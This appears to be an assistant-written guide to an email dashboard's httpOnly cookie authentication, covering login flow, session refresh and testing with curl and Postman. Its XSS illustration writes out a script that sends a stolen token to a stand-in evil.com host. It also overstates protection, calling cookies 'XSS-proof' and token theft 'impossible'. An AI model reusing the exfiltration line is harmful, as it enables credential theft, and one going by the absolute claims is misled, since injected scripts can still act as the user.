# Cookie-Based Authentication Explained

## Why You're Getting "Authentication token is required" Error

### ❌ What You Tried (Doesn't Work):
```
GET http://localhost:3000/api/v1/users
Authorization: Bearer <token>
```

**Response:**
```json
{
  "success": false,
  "message": "Authentication token is required"
}
```

### ✅ Why It Doesn't Work:

This application uses **httpOnly cookie-based authentication**, NOT Bearer token authentication.

The backend is looking for `auth_token` in **cookies**, not in the `Authorization` header:

```typescript
// backend: email_dashboard-be/src/middlewares/auth.middleware.ts
export const authenticateToken = async (req, res, next) => {
  // Get token from cookie instead of Authorization header
  const token = req.cookies?.auth_token;  // ✅ Expects cookie
  
  if (!token) {
    res.status(401).json({
      success: false,
      message: 'Authentication token is required',  // ⬅️ This is what you're seeing
    });
    return;
  }
  // ...
}
```

---

## Cookie-Based vs Bearer Token Authentication

| Feature | Cookie-Based (This App) | Bearer Token |
|---------|------------------------|--------------|
| **Storage** | httpOnly cookie (browser managed) | localStorage or memory |
| **Security** | More secure (XSS-proof) | Vulnerable to XSS attacks |
| **CSRF Protection** | Requires CSRF tokens | Not needed |
| **Mobile Apps** | More complex | Easy to implement |
| **Token Access** | Not accessible from JavaScript | Accessible from JavaScript |
| **Automatic Sending** | Browser sends automatically | Must be added manually |

---

## How Authentication Works in This App

### 1. **Login Flow**

```javascript
// Frontend calls login API
POST /api/v1/auth/login
Body: { email, password }

// Backend response:
{
  "success": true,
  "user": { ... }
}

// Backend ALSO sets httpOnly cookie:
Set-Cookie: auth_token=<JWT>; HttpOnly; Secure; SameSite=Strict; Max-Age=1800
```

**Key Point:** The JWT token is stored in an httpOnly cookie, which:
- Cannot be accessed by JavaScript (prevents XSS attacks)
- Is automatically sent by the browser on every request to the same domain
- Is secure and managed by the browser

### 2. **Authenticated Requests**

```javascript
// Frontend makes API call
GET /api/v1/users
// Browser automatically includes cookies:
Cookie: auth_token=<JWT>

// Backend authenticates:
1. Reads auth_token from req.cookies
2. Verifies JWT signature
3. Checks user exists in database
4. Allows access if valid
```

**Key Point:** You don't need to manually add authentication headers. The browser does it automatically.

### 3. **Frontend API Configuration**

```javascript
// email_dashboard-fe/src/api/base.js
const config = {
  credentials: 'include',  // ✅ CRITICAL: Tells browser to send cookies
  headers: {
    'Content-Type': 'application/json',
  },
};

const response = await fetch(url, config);
```

---

## Why Your Session Is Invalid

You have an **old session** from before the authentication fixes were applied. This old session:

1. ❌ Has no `auth_token` cookie (or an expired one)
2. ❌ Has user data in localStorage but no `last_activity` timestamp
3. ❌ Triggers session warnings incorrectly
4. ❌ Cannot make authenticated API calls

---

## ✅ AUTOMATIC FIX - Just Refresh!

I've added **automatic detection** of old/invalid sessions in `AuthContext.jsx`:

```javascript
// Detects old sessions without activity tracking
if (storedUser && !lastActivity) {
  console.log('Detected old session without activity tracking. Clearing session...');
  authService.clearAuth();
  sessionManager.clearSession();
  setUser(null);
  setToken(null);
  setIsLoading(false);
  return;
}
```

### 🎯 Steps to Fix (SUPER EASY):

1. **Simply refresh your browser page** (F5 or Ctrl+R)
2. You'll be **automatically redirected** to the login page
3. **Log in** with your credentials
4. ✅ **Done!** Your session is now properly configured

**That's it!** The app will detect your old session and clear it automatically.

---

## How to Test the API Correctly

### ❌ Wrong Way (Bearer Token):
```bash
curl http://localhost:3000/api/v1/users \
  -H "Authorization: Bearer <token>"
```

### ✅ Correct Way (With Cookies):

**Option 1: Use the Frontend** (Recommended)
1. Log in through the UI
2. Navigate to Settings → User Management
3. The browser automatically sends cookies with each request

**Option 2: cURL with Cookies**
```bash
# First, login and save cookies
curl -X POST http://localhost:3000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin100@matangiindustries.com","password":"yourpassword"}' \
  -c cookies.txt

# Then, use saved cookies for authenticated requests
curl http://localhost:3000/api/v1/users \
  -b cookies.txt
```

**Option 3: Postman**
1. POST to `/api/v1/auth/login` with email/password
2. Postman automatically saves the `auth_token` cookie
3. Subsequent requests in the same Postman session will include the cookie
4. Make sure "Automatically follow redirects" and "Enable cookie jar" are ON in Postman settings

**Option 4: Browser DevTools**
1. Open DevTools (F12)
2. Go to **Network** tab
3. Log in through the UI
4. Look at any API request
5. Check **Headers** → **Cookie** section
6. You'll see `auth_token=<JWT>`

---

## Session Management After Login

### What Happens After You Log In (New Session):

1. ✅ **User data stored** in localStorage
2. ✅ **`auth_token` cookie** set by backend (30-minute expiry)
3. ✅ **`last_activity` timestamp** set in localStorage
4. ✅ **Session tracking** initialized
5. ✅ **Activity listeners** attached (mouse, keyboard, scroll)

### On Every Activity (mouse, keyboard, scroll):

1. ✅ **`last_activity` timestamp** updated in localStorage
2. ✅ **Session timer** resets to 30 minutes

### On Every API Call (after 5 minutes):

1. ✅ **Backend checks** token age
2. ✅ **If token > 5 min old:** Backend generates **new token**
3. ✅ **New cookie set** with fresh 30-minute expiry
4. ✅ **Token logged** in backend: "Token refreshed for user: email"

**Result:** Your session persists indefinitely as long as you're active!

---

## Checking Your Current Session

### Browser Console (F12):

```javascript
// Check if user data exists
console.log('User:', localStorage.getItem('user'));

// Check last activity timestamp
console.log('Last Activity:', localStorage.getItem('last_activity'));

// Check session start
console.log('Session Start:', localStorage.getItem('session_start'));

// Check cookies (you won't see httpOnly cookies here)
console.log('All Cookies:', document.cookie);
// Note: auth_token won't appear because it's httpOnly

// Check session validity
console.log('Session Expired?:', 
  Date.now() - parseInt(localStorage.getItem('last_activity')) > 30*60*1000
);
```

### Browser DevTools → Application Tab:

1. **Local Storage:**
   - `user` - Should have your user object
   - `last_activity` - Should have a recent timestamp
   - `session_start` - Should have login timestamp

2. **Cookies:**
   - `auth_token` - Your JWT token (you'll see it exists but can't read value due to httpOnly)

### Backend Logs:

```bash
# Check backend logs for auth activity
Get-Content "D:\New folder\EmailDashboard\email_dashboard-be\logs\combined.log" | Select-Object -Last 50

# Look for:
- "Generated JWT token for user: [email]" (on login)
- "Token refreshed for user: [email]" (every 5+ minutes on API calls)
- "Authentication error" (if token is invalid/expired)
```

---

## Common Issues & Solutions

### Issue 1: "Authentication token is required" on `/users` API

**Cause:** No valid `auth_token` cookie

**Solution:** 
1. Refresh the page (auto-detects old session)
2. Log in again
3. Cookie will be set automatically

---

### Issue 2: Session Warning Appears Immediately

**Cause:** Old session with missing `last_activity` timestamp

**Solution:**
1. Refresh the page (auto-clears old session)
2. Log in again
3. Activity tracking will work correctly

---

### Issue 3: User Data in localStorage but Can't Access Settings

**Cause:** User data exists but `auth_token` cookie is missing/expired

**Solution:**
1. Refresh the page (auto-detects invalid session)
2. Log in again
3. Both localStorage and cookie will be set

---

### Issue 4: Cookies Not Being Sent by Browser

**Cause:** Frontend and backend on different domains/ports

**Current Setup:**
- Frontend: `http://localhost:5173` (Vite dev server)
- Backend: `http://localhost:3000`

**Check `vite.config.js` proxy:**
```javascript
export default defineConfig({
  server: {
    proxy: {
      '/api': {
        target: 'http://localhost:3000',
        changeOrigin: true,
      }
    }
  }
})
```

This ensures cookies work correctly across different ports.

---

## Why httpOnly Cookies Are Better

### Security Benefits:

1. **XSS Protection:** JavaScript cannot access the token
2. **Automatic Management:** Browser handles storage and sending
3. **Secure Flag:** Only sent over HTTPS in production
4. **SameSite:** Prevents CSRF attacks
5. **Expiry:** Browser automatically removes expired cookies

### How This Protects You:

```javascript
// ❌ If attacker injects malicious script (XSS attack):
<script>
  // Try to steal token
  const token = localStorage.getItem('auth_token');  // Would work with Bearer tokens
  fetch('https://evil.com/steal', { body: token });
</script>

// ✅ With httpOnly cookies:
<script>
  const token = document.cookie;  // Cannot access httpOnly cookies! ✅
  // Token theft is impossible via JavaScript
</script>
```

---

## Summary

| Aspect | Status |
|--------|--------|
| **Authentication Method** | httpOnly Cookie-based |
| **Token Location** | `auth_token` cookie (httpOnly, Secure, SameSite) |
| **Token in Header?** | ❌ No (Backend doesn't check Authorization header) |
| **Token in Cookie?** | ✅ Yes (Backend reads from `req.cookies.auth_token`) |
| **Manual Token Handling?** | ❌ No (Browser handles automatically) |
| **Frontend Config** | `credentials: 'include'` in fetch |
| **Token Expiry** | 30 minutes (refreshed every 5+ min on activity) |
| **Session Timeout** | 30 minutes inactivity |
| **Old Session Handling** | ✅ Auto-detected and cleared on page load |

---

## Next Steps

1. **Refresh your browser** (F5)
2. **Log in** when redirected
3. **Navigate to Settings** → User Management
4. ✅ **User list should load** successfully!

The authentication system is now fully functional with:
- ✅ Automatic old session detection
- ✅ Proper cookie-based authentication
- ✅ Activity-based session management
- ✅ Token auto-refresh
- ✅ Session timeout warnings

You're all set! 🎉

